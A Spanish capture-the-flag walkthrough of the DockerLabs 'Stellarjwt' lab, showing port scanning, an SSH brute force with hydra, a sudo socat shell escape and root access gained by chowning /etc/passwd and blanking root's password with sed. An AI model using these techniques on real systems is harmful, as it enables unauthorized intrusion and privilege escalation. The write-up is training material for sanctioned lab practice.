#MAQUINA #DOCKERLABS #FACIL 
#JWT 

<hr>

# RECONOCIMIENTO

Vamos a resolver **Stellarjwt** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:33 CET
Initiating ARP Ping Scan at 17:33
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:33, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:33
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:33, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-10 17:33:06 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:33 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 13:fd:a1:b2:31:9d:ea:33:a1:43:af:44:20:3a:12:12 (ECDSA)
|_  256 a0:4f:c4:a9:00:af:cb:78:28:fd:94:c0:86:28:dc:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NASA Hackeada
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:34 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.
## HTTP (80)

Usamos **gobuster** para enumerar:

   ```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 1905]
/universe             (Status: 301) [Size: 311] [--> http://172.17.0.2/universe/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Si nos metemos en universe y hacemos Ctrl + u, encontramos un token:

Usuario -> **neptuno**

Al revisar la web que hay en el puerto 80, vemos que hay una pregunta en la principal:

   ```bash
¿Qué astrónomo alemán descubrió Neptuno?
   ```
   
Creamos un diccionario con esto:
   ```bash
johann
gottfried
galle
Johann
Gottfried
Galle
   ```

# EXPLOTACION

Usamos **hydra** para intentar sacar su contraseña:

   ```bash
hydra -l neptuno -P contras  ssh://172.17.0.2 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-10 17:40:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: neptuno   password: Gottfried
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-10 17:40:41

```
**usuario : neptuno**
**contraseña: Gottfried**

# ESCALADA PRIVILEGIOS

Buscamos archivos en el directorio personal y hay una **.carta_a_la_NASA.txt** :
   ```bash
Buenos días, quiero entrar en la NASA. Ya respondí las preguntas que me hicieron. Se las respondo de nuevo por aquí.

¿Qué significan las siglas NASA? -> National Aeronautics and Space Administration
¿En que año se fundo la NASA? -> 1958
¿Quién fundó la NASA? -> Eisenhower

Por favor, necesito entrar!!
```

Usuario -> **nasa** (/etc/passwd):**Eisenhower**

Buscamos archivos con permisos SUDO:
   ```bash
nasa@c455fb384540:/home/neptuno$ sudo -l
Matching Defaults entries for nasa on c455fb384540:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User nasa may run the following commands on c455fb384540:
    (elite) NOPASSWD: /usr/bin/socat

```
Vemos **socat** con permisos SUDO :
   ```bash
nasa@c455fb384540:/home/neptuno$ sudo -u elite socat stdin exec:/bin/sh
2024/12/11 17:06:24 socat[146] W address is opened in read-write mode but only supports read-only
whoami
elite
```

YA ESTAMOS COMO ELITE.

Buscamos archivos con permisos SUDO:
   ```bash
sudo -l
Matching Defaults entries for elite on c455fb384540:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User elite may run the following commands on c455fb384540:
    (root) NOPASSWD: /usr/bin/chown

```

Vemos **chown** con permisos SUDO , cambiamos propietario a **/etc/passwd** y a **/etc** y ejecutamos script para quitarle la necesidad de ingresar contraseña al hacer **su root** :

   ```bash
   
sudo chown elite:elite /etc
sudo chown elite:elite /etc/passwd
cat script.sh 
#!/bin/sh

# Definir las variables
var1="root:x:0:0:root:/root:/bin/bash"
var2="root::0:0:root:/root:/bin/bash"

# Realizar la sustitución y escribir el resultado en un archivo temporal
sed "s#$var1#$var2#" /etc/passwd > passwd_tmp

# Reemplazar el archivo original con el archivo temporal
mv passwd_tmp /etc/passwd

nasa@c455fb384540:/home/neptuno$ su root
root@c455fb384540:/home/neptuno# whoami
root
root@c455fb384540:/home/neptuno#

```

**YA ESTAMOS COMO ROOT.**